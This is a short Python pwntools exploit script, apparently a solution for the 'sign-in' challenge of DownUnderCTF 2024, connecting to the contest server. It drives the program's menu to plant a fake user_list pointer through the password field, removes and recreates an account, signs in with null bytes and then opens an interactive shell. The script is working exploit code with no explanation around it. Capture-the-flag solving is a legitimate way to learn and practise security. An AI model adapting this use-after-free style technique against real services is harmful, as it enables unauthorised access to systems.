from pwn import *
#io = process("./sign-in")
io = remote(b"2024.ductf.dev",30022)

def sign_up(username,password):
    io.sendlineafter(b"> ",b"1")
    io.sendafter(b"username:",username)
    io.sendafter(b"password:",password)

def sign_in(username,password):
    io.sendlineafter(b"> ",b"2")
    io.sendafter(b"username:",username)
    io.sendafter(b"password:",password)

def remove_account():
    io.sendlineafter(b"> ",b"3")


fake_user_list = 0x402eb8

# 0x0000000000402eb8â”‚+0x27d8: 0x00000000004003d8
# 0x4003d8:       0x0000000000000000      0x0000000000000000
# 0x4003e8:       0x0000000000000000

sign_up(b"ABCD",p64(fake_user_list))
sign_in(b"ABCD",p64(fake_user_list))
remove_account() 
sign_up(b"ABCD",b"ABCD")

sign_in(b"\x00",b"\x00")

#gdb.attach(io,gdbscript="tele &user_list")
io.sendlineafter(b"> ",b"4")
io.interactive()
